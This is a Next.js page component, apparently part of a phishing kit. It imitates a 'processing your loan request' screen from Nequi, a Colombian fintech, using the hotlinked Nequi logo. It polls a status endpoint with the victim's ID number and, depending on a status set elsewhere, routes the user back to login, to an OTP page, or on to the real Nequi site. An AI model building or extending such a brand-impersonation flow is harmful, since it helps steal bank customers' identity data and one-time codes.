'use client'

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import Image from "next/image";
import LoadingSpinner from "@/app/components/loading-spinner";
import { Button } from "@/components/ui/button";
import TransitionLoader from "../components/transition-loader";
import { CheckCircle, XCircle, AlertCircle } from "lucide-react"; // Íconos para feedback visual

export default function ProcesandoPage() {
  const [status, setStatus] = useState("processing");
  const [showTransition, setShowTransition] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();
  const cedulaRef = useRef<string | null>(null);

  useEffect(() => {
    cedulaRef.current = sessionStorage.getItem("cedula");
    if (!cedulaRef.current) {
      router.push("/login");
      return;
    }

    const controller = new AbortController();
    const { signal } = controller;

    const fetchStatus = async () => {
      try {
        const response = await fetch(`/api/loan-status?cedula=${cedulaRef.current}`, { signal });
        const data = await response.json();

        if (!response.ok) throw new Error(data.message || "Error al obtener el estado");

        if (data.status !== "processing") {
          setShowTransition(true);
          setTimeout(() => {
            setStatus(data.status);
            setShowTransition(false);
            handleRedirection(data.status);
          }, 2000);
        }
      } catch (err) {
        if (err instanceof Error && err.name !== "AbortError") {
          setError("Hubo un problema al verificar el estado. Inténtalo de nuevo.");
        }
      }
    };

    fetchStatus();
    const interval = setInterval(fetchStatus, 2000);

    return () => {
      clearInterval(interval);
      controller.abort();
    };
  }, [router]);

  const handleRedirection = (status: string) => {
    if (status === "retry") {
      setTimeout(() => {
        sessionStorage.clear();
        router.push("/login");
      }, 3000);
    } else if (status === "otp") {
      setTimeout(() => router.push("/otp"), 3000);
    } else {
      // Redirigir a una página externa para estados finales (approved, rejected, etc.)
      const externalUrl = "https://www.nequi.com.co/personas/credito/propulsor"; // Cambia esto por la URL externa deseada
      setTimeout(() => window.location.href = externalUrl, 5000);
    }
  };

  return (
    <main className="min-h-screen bg-pink-50 relative">
      <nav className="relative z-10 bg-white shadow-sm px-4 py-2 flex justify-between items-center max-w-7xl mx-auto">
        <Image
          src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
          alt="Nequi Logo"
          width={120}
          height={40}
          priority
        />
        <Button
          variant="ghost"
          onClick={() => window.location.reload()}
          className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
        >
          Recargar
        </Button>
      </nav>

      {showTransition && <TransitionLoader />}

      <div className="container mx-auto px-4 py-8 max-w-3xl">
        <Card className="shadow-lg border-2">
          <CardHeader className="text-center pb-2">
            <CardTitle className="text-2xl font-manrope">
              {status === "processing" && "Procesando solicitud..."}
              {status === "approved" && "¡Solicitud Aprobada!"}
              {status === "rejected" && "Solicitud Rechazada"}
              {status === "retry" && "¡Ups no se pudo!"}
              {status === "otp" && "Verificación Adicional Requerida"}
            </CardTitle>
          </CardHeader>
          <CardContent className="text-center space-y-6 pt-4">
            {error ? (
              <>
                <AlertCircle className="mx-auto h-12 w-12 text-red-600" />
                <p className="text-lg text-red-600">{error}</p>
                <Button onClick={() => window.location.reload()}>Volver a intentar</Button>
              </>
            ) : status === "processing" ? (
              <>
                <LoadingSpinner />
                <p className="text-lg font-medium text-[#200020]">
                  Estamos validando tu información
                </p>
                <p className="text-gray-600">
                  Este proceso puede tardar unos minutos. Por favor, no cierres esta ventana.
                </p>
              </>
            ) : status === "approved" ? (
              <>
                <CheckCircle className="mx-auto h-12 w-12 text-green-600" />
                <p className="text-lg text-gray-700">
                  Tu crédito ha sido aprobado. 
                </p>
                <p className="text-lg text-gray-700 mt-4">
                  Serás redirigido en unos segundos...
                </p>
              </>
            ) : status === "rejected" ? (
              <>
                <XCircle className="mx-auto h-12 w-12 text-red-600" />
                <p className="text-lg text-gray-700">
                  No podemos aprobar tu solicitud en este momento. Redirigiendo...
                </p>
              </>
            ) : status === "otp" ? (
              <>
                <AlertCircle className="mx-auto h-12 w-12 text-yellow-600" />
                <p className="text-lg text-gray-700">
                  Necesitamos una verificación adicional. Serás redirigido a la página de OTP...
                </p>
                <p className="text-lg text-gray-700 mt-4">
                  Serás redirigido a la página de OTP...
                </p>
              </>
            ) : (
              <>
                <AlertCircle className="mx-auto h-12 w-12 text-gray-600" />
                <p className="text-lg text-gray-700">
                  Hubo un problema con la solicitud. 
                </p>

                <p className="text-lg text-gray-700 mt-4">
                Volviendo al inicio...
                </p>
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  );
}